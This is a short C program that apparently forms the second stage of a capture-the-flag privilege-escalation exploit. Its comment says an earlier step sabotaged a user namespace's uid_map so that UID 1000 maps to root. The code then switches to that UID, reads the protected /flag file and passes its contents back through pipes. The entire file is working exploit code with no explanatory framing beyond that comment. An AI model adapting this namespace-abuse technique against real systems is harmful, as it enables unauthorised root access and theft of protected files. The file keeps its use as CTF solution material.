#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define DEFAULT_UID 1000

int main(void) {
  int stdin_fds[2], stdout_fds[2];
  pipe(stdin_fds);
  pipe(stdout_fds);
  dup2(stdin_fds[1], STDIN_FILENO);
  dup2(stdout_fds[0], STDOUT_FILENO);

  char c;
  read(stdin_fds[0], &c, sizeof(c));

  /*
   * setresuid() in become_user_group() failed, because we sabotaged populating
   * uid_map earlier. Now that we defined uid_map to map DEFAULT_UID to root,
   * switch to it.
   */
  setresuid(DEFAULT_UID, DEFAULT_UID, DEFAULT_UID);

  int fd = open("/flag", O_RDONLY);
  char msg[256];
  if (fd == -1) {
    snprintf(msg, sizeof(msg), "open() = -%d\n", errno);
    write(stdout_fds[1], msg, strlen(msg));
  } else {
    write(stdout_fds[1], msg, read(fd, msg, sizeof(msg)));
  }
  while (1) {
    pause();
  }
}
